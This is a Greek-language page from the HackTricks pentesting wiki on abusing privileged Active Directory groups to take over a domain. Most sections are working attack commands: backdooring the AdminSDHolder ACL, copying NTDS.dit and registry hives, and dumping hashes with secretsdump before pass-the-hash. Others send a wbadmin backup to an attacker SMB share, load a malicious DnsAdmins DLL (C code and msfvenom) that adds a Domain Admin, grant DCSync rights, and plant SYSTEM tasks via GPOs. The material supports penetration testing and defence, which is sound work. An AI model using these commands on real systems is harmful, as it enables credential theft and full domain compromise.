# Προνομιούχες Ομάδες

{{#include ../../banners/hacktricks-training.md}}

## Καλά γνωστές ομάδες με δικαιώματα διαχείρισης

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Αυτή η ομάδα έχει εξουσιοδότηση να δημιουργεί λογαριασμούς και ομάδες που δεν είναι **Administrators** στο domain. Επιπλέον, επιτρέπει τοπική σύνδεση στον Domain Controller (DC).

Για να εντοπιστούν τα μέλη αυτής της ομάδας, εκτελείται η ακόλουθη εντολή:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Επιτρέπεται η προσθήκη νέων χρηστών, καθώς και η τοπική σύνδεση στον DC.

## Ομάδα AdminSDHolder

Η Access Control List (ACL) της ομάδας **AdminSDHolder** είναι κρίσιμη, καθώς ορίζει τα δικαιώματα για όλες τις "προστατευμένες ομάδες" στο Active Directory, συμπεριλαμβανομένων των ομάδων με υψηλά προνόμια. Αυτός ο μηχανισμός εξασφαλίζει την ασφάλεια αυτών των ομάδων αποτρέποντας μη εξουσιοδοτημένες τροποποιήσεις.

Ένας επιτιθέμενος θα μπορούσε να εκμεταλλευτεί αυτό τροποποιώντας την ACL της ομάδας **AdminSDHolder**, χορηγώντας πλήρη δικαιώματα σε έναν τυπικό χρήστη. Αυτό θα έδινε πρακτικά σε αυτόν τον χρήστη τον πλήρη έλεγχο όλων των προστατευμένων ομάδων. Εάν τα δικαιώματα αυτού του χρήστη αλλάξουν ή αφαιρεθούν, θα αποκατασταθούν αυτόματα εντός μίας ώρας λόγω του σχεδιασμού του συστήματος.

Η πρόσφατη τεκμηρίωση του Windows Server εξακολουθεί να θεωρεί αρκετές ενσωματωμένες ομάδες χειριστών ως αντικείμενα **προστατευμένα** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, κ.λπ.). Η διαδικασία **SDProp** τρέχει στον **PDC Emulator** κάθε 60 λεπτά από προεπιλογή, θέτει το `adminCount=1` και απενεργοποιεί την κληρονομικότητα στα προστατευμένα αντικείμενα. Αυτό είναι χρήσιμο τόσο για persistence όσο και για τον εντοπισμό ανενεργών προνομιούχων χρηστών που αφαιρέθηκαν από μια προστατευμένη ομάδα αλλά εξακολουθούν να διατηρούν την ACL χωρίς κληρονομικότητα.

Εντολές για την επισκόπηση των μελών και την τροποποίηση δικαιωμάτων περιλαμβάνουν:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Διατίθεται ένα script για να επιταχύνει τη διαδικασία επαναφοράς: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Για περισσότερες λεπτομέρειες, επισκεφθείτε [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Η συμμετοχή σε αυτήν την ομάδα επιτρέπει την ανάγνωση των διαγραμμένων αντικειμένων του Active Directory, τα οποία μπορούν να αποκαλύψουν ευαίσθητες πληροφορίες:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Αυτό είναι χρήσιμο για **την ανάκτηση προηγούμενων διαδρομών προνομίων**. Διαγραμμένα αντικείμενα μπορούν ακόμα να αποκαλύψουν `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, παλιά SPNs, ή το DN μιας διαγραμμένης ομάδας με προνόμια που μπορεί αργότερα να αποκατασταθεί από άλλον χειριστή.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Domain Controller Access

Η πρόσβαση σε αρχεία στον DC είναι περιορισμένη εκτός αν ο χρήστης είναι μέλος της `Server Operators` ομάδας, που αλλάζει το επίπεδο πρόσβασης.

### Privilege Escalation

Χρησιμοποιώντας `PsService` ή `sc` από Sysinternals, μπορεί κανείς να ελέγξει και να τροποποιήσει τα δικαιώματα υπηρεσιών. Η ομάδα `Server Operators`, για παράδειγμα, έχει πλήρη έλεγχο σε ορισμένες υπηρεσίες, επιτρέποντας την εκτέλεση αυθαίρετων εντολών και privilege escalation:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Αυτή η εντολή αποκαλύπτει ότι οι `Server Operators` έχουν πλήρη πρόσβαση, επιτρέποντας την τροποποίηση υπηρεσιών για ανύψωση προνομίων.

## Backup Operators

Η συμμετοχή στην ομάδα `Backup Operators` παρέχει πρόσβαση στο σύστημα αρχείων του `DC01` λόγω των προνομίων `SeBackup` και `SeRestore`. Αυτά τα προνόμια επιτρέπουν την περιήγηση σε φακέλους, την απαρίθμηση και την αντιγραφή αρχείων, ακόμα και χωρίς ρητές άδειες, χρησιμοποιώντας τη σημαία `FILE_FLAG_BACKUP_SEMANTICS`. Είναι απαραίτητη η χρήση συγκεκριμένων scripts για αυτή τη διαδικασία.

Για να απαριθμήσετε τα μέλη της ομάδας, εκτελέστε:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Τοπική Επίθεση

Για να αξιοποιηθούν αυτά τα προνόμια τοπικά, εφαρμόζονται τα ακόλουθα βήματα:

1. Εισαγωγή των απαραίτητων βιβλιοθηκών:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Ενεργοποιήστε και επαληθεύστε `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Πρόσβαση και αντιγραφή αρχείων από περιορισμένους καταλόγους, για παράδειγμα:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Επίθεση AD

Η άμεση πρόσβαση στο σύστημα αρχείων του Domain Controller επιτρέπει την κλοπή της βάσης δεδομένων `NTDS.dit`, η οποία περιέχει όλα τα NTLM hashes για τους χρήστες και τους υπολογιστές του domain.

#### Χρήση diskshadow.exe

1. Δημιουργήστε ένα shadow copy της μονάδας `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Αντιγράψτε το `NTDS.dit` από το shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Εναλλακτικά, χρησιμοποιήστε `robocopy` για αντιγραφή αρχείων:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Εξαγωγή των `SYSTEM` και `SAM` για την ανάκτηση hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Ανάκτηση όλων των hashes από `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Μετά-εξαγωγή: Pass-the-Hash σε DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Χρήση wbadmin.exe

1. Ρυθμίστε σύστημα αρχείων NTFS για SMB server στο attacker machine και αποθηκεύστε προσωρινά (cache) τα SMB credentials στο target machine.
2. Χρησιμοποιήστε `wbadmin.exe` για δημιουργία αντιγράφου συστήματος και εξαγωγή του `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Τα μέλη της ομάδας **DnsAdmins** μπορούν να εκμεταλλευτούν τα προνόμιά τους για να φορτώσουν ένα αυθαίρετο DLL με δικαιώματα SYSTEM σε έναν DNS server, ο οποίος συχνά φιλοξενείται σε Domain Controllers. Αυτή η δυνατότητα παρέχει σημαντικό εκμεταλλευτικό δυναμικό.

Για να απαριθμήσετε τα μέλη της ομάδας DnsAdmins, χρησιμοποιήστε:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Εκτέλεση αυθαίρετου DLL (CVE‑2021‑40469)

> [!NOTE]
> Αυτή η ευπάθεια επιτρέπει την εκτέλεση αυθαίρετου κώδικα με δικαιώματα SYSTEM στην υπηρεσία DNS (συνήθως μέσα στους DCs). Το ζήτημα αυτό διορθώθηκε το 2021.

Τα μέλη μπορούν να κάνουν τον DNS server να φορτώσει ένα αυθαίρετο DLL (είτε τοπικά είτε από απομακρυσμένο κοινόχρηστο φάκελο) χρησιμοποιώντας εντολές όπως:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Η επανεκκίνηση της υπηρεσίας DNS (η οποία μπορεί να απαιτεί πρόσθετα δικαιώματα) είναι απαραίτητη για να φορτωθεί το DLL:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Για περισσότερες λεπτομέρειες σχετικά με αυτό το διάνυσμα επίθεσης, ανατρέξτε στο ired.team.

#### Mimilib.dll

Είναι επίσης εφικτό να χρησιμοποιηθεί το mimilib.dll για την εκτέλεση εντολών, τροποποιώντας το ώστε να εκτελεί συγκεκριμένες εντολές ή reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) για περισσότερες πληροφορίες.

### WPAD εγγραφή για MitM

Τα μέλη του DnsAdmins μπορούν να χειριστούν εγγραφές DNS για να πραγματοποιήσουν Man-in-the-Middle (MitM) επιθέσεις δημιουργώντας μια WPAD εγγραφή αφού απενεργοποιήσουν την global query block list. Εργαλεία όπως Responder ή Inveigh μπορούν να χρησιμοποιηθούν για spoofing και καταγραφή της δικτυακής κίνησης.

### Event Log Readers

Τα μέλη μπορούν να έχουν πρόσβαση στα αρχεία καταγραφής συμβάντων, ενδεχομένως βρίσκοντας ευαίσθητες πληροφορίες όπως plaintext passwords ή λεπτομέρειες εκτέλεσης εντολών:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Αυτή η ομάδα μπορεί να τροποποιήσει τα DACLs στο αντικείμενο domain, ενδεχομένως χορηγώντας δικαιώματα DCSync. Τεχνικές για privilege escalation που εκμεταλλεύονται αυτήν την ομάδα περιγράφονται αναλυτικά στο Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Εάν μπορείτε να ενεργήσετε ως μέλος αυτής της ομάδας, η κλασική κατάχρηση είναι να χορηγήσετε σε έναν attacker-controlled principal τα δικαιώματα αναπαραγωγής που απαιτούνται για το [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Ιστορικά, **PrivExchange** συνέδεε πρόσβαση σε γραμματοκιβώτια, εξαναγκασμένη πιστοποίηση Exchange και LDAP relay για να οδηγήσει στο ίδιο primitive. Ακόμα και όπου αυτή η διαδρομή relay έχει μετριαστεί, η άμεση συμμετοχή στο `Exchange Windows Permissions` ή ο έλεγχος ενός Exchange server παραμένει ένας υψηλής αξίας δρόμος προς δικαιώματα domain replication.

## Hyper-V Administrators

Hyper-V Administrators έχουν πλήρη πρόσβαση στο Hyper-V, το οποίο μπορεί να εκμεταλλευτεί για να αποκτήσει κανείς έλεγχο επί εικονικοποιημένων Domain Controllers. Αυτό περιλαμβάνει κλωνοποίηση ενεργών DCs και εξαγωγή NTLM hashes από το αρχείο NTDS.dit.

### Exploitation Example

Η πρακτική κατάχρηση είναι συνήθως **offline πρόσβαση σε δίσκους/checkpoints των DC** παρά τα παλιά κόλπα LPE σε επίπεδο host. Με πρόσβαση στο Hyper-V host, ένας χειριστής μπορεί να κάνει checkpoint ή να εξάγει έναν εικονικοποιημένο Domain Controller, να προσαρτήσει το VHDX και να εξαγάγει τα `NTDS.dit`, `SYSTEM` και άλλα μυστικά χωρίς να αγγίξει το LSASS μέσα στο guest:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Από εκεί, επαναχρησιμοποιήστε τη ροή εργασιών των `Backup Operators` για να αντιγράψετε το `Windows\NTDS\ntds.dit` και τα registry hives εκτός σύνδεσης.

## Group Policy Creators Owners

Αυτή η ομάδα επιτρέπει στα μέλη να δημιουργούν Group Policies στο domain. Ωστόσο, τα μέλη της δεν μπορούν να εφαρμόσουν group policies σε χρήστες ή groups ούτε να επεξεργαστούν υπάρχοντα GPOs.

Η σημαντική λεπτομέρεια είναι ότι ο **δημιουργός γίνεται ιδιοκτήτης του νέου GPO** και συνήθως αποκτά αρκετά δικαιώματα για να το επεξεργαστεί στη συνέχεια. Αυτό σημαίνει ότι αυτή η ομάδα είναι ενδιαφέρουσα όταν μπορείτε είτε:

- δημιουργήσετε ένα κακόβουλο GPO και να πείσετε έναν admin να το συνδέσει σε ένα στοχευμένο OU/domain
- επεξεργαστείτε ένα GPO που δημιουργήσατε και είναι ήδη linked κάπου χρήσιμο
- καταχραστείτε κάποιο άλλο εκχωρημένο δικαίωμα που σας επιτρέπει να linkάρετε GPOs, ενώ αυτή η ομάδα σας παρέχει τα δικαιώματα επεξεργασίας

Στην πράξη, η κατάχρηση συνήθως σημαίνει την προσθήκη ενός **Immediate Task**, **startup script**, **local admin membership**, ή αλλαγής **user rights assignment** μέσω SYSVOL-backed policy files.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
If editing the GPO manually through `SYSVOL`, remember the change is not enough by itself: `versionNumber`, `GPT.ini`, and sometimes `gPCMachineExtensionNames` must also be updated or clients will ignore the policy refresh.

## Organization Management

Σε περιβάλλοντα όπου έχει αναπτυχθεί το **Microsoft Exchange**, μια ειδική ομάδα γνωστή ως **Organization Management** διαθέτει σημαντικές δυνατότητες. Αυτή η ομάδα έχει προνόμια για να **πρόσβαση στα mailboxes όλων των domain users** και διατηρεί **πλήρη έλεγχο πάνω στην Organizational Unit (OU) 'Microsoft Exchange Security Groups'**. Αυτός ο έλεγχος περιλαμβάνει την ομάδα **`Exchange Windows Permissions`**, η οποία μπορεί να αξιοποιηθεί για privilege escalation.

### Privilege Exploitation and Commands

#### Print Operators

Τα μέλη της ομάδας **Print Operators** έχουν αρκετά προνόμια, συμπεριλαμβανομένου του **`SeLoadDriverPrivilege`**, το οποίο τους επιτρέπει να **συνδεθούν τοπικά σε έναν Domain Controller**, να τον τερματίσουν και να διαχειριστούν εκτυπωτές. Για να εκμεταλλευτεί κάποιος αυτά τα προνόμια, ειδικά αν το **`SeLoadDriverPrivilege`** δεν είναι ορατό σε μη ανυψωμένο πλαίσιο, είναι απαραίτητο να παρακαμφθεί το User Account Control (UAC).

Για να εμφανιστούν τα μέλη αυτής της ομάδας, χρησιμοποιείται η ακόλουθη εντολή PowerShell:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Σε Domain Controllers αυτή η ομάδα είναι επικίνδυνη επειδή η προεπιλεγμένη Domain Controller Policy χορηγεί **`SeLoadDriverPrivilege`** στους `Print Operators`. Εάν αποκτήσετε ένα elevated token για μέλος αυτής της ομάδας, μπορείτε να ενεργοποιήσετε το privilege και να φορτώσετε έναν signed-but-vulnerable driver για να κάνετε jump στο kernel/SYSTEM. Για λεπτομέρειες σχετικά με τον χειρισμό των tokens, δείτε [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Χρήστες Remote Desktop

Τα μέλη αυτής της ομάδας έχουν χορηγηθεί πρόσβαση σε PCs μέσω Remote Desktop Protocol (RDP). Για να απαριθμήσετε αυτά τα μέλη, υπάρχουν διαθέσιμες εντολές PowerShell:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Περαιτέρω πληροφορίες για το exploiting του RDP μπορούν να βρεθούν σε εξειδικευμένους πόρους pentesting.

#### Χρήστες Απομακρυσμένης Διαχείρισης

Τα μέλη μπορούν να έχουν πρόσβαση σε υπολογιστές μέσω του **Windows Remote Management (WinRM)**. Enumeration αυτών των μελών επιτυγχάνεται μέσω:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Για τεχνικές εκμετάλλευσης σχετικές με **WinRM**, πρέπει να συμβουλευτείτε την αντίστοιχη τεκμηρίωση.

#### Διαχειριστές διακομιστή

Αυτή η ομάδα έχει δικαιώματα να εκτελεί διάφορες ρυθμίσεις στους ελεγκτές τομέα (Domain Controllers), συμπεριλαμβανομένων δικαιωμάτων δημιουργίας αντιγράφων ασφαλείας και επαναφοράς, αλλαγής της ώρας συστήματος και τερματισμού του συστήματος. Για να απαριθμήσετε τα μέλη, η εντολή που παρέχεται είναι:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Σε Domain Controllers, οι `Server Operators` συνήθως κληρονομούν αρκετά δικαιώματα για να **αναδιαμορφώσουν ή να ξεκινήσουν/σταματήσουν υπηρεσίες** και επίσης λαμβάνουν τα `SeBackupPrivilege`/`SeRestorePrivilege` μέσω της προεπιλεγμένης πολιτικής του DC. Στην πράξη, αυτό τους καθιστά μια γέφυρα μεταξύ **service-control abuse** και **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Εάν ένα ACL υπηρεσίας παρέχει σε αυτήν την ομάδα δικαιώματα αλλαγής/εκκίνησης, δείξτε την υπηρεσία σε μια αυθαίρετη εντολή, εκκινήστε την ως `LocalSystem`, και στη συνέχεια επαναφέρετε το αρχικό `binPath`. Εάν ο έλεγχος υπηρεσίας είναι κλειδωμένος, επιστρέψτε στις τεχνικές `Backup Operators` παραπάνω για να αντιγράψετε το `NTDS.dit`.

## Αναφορές <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
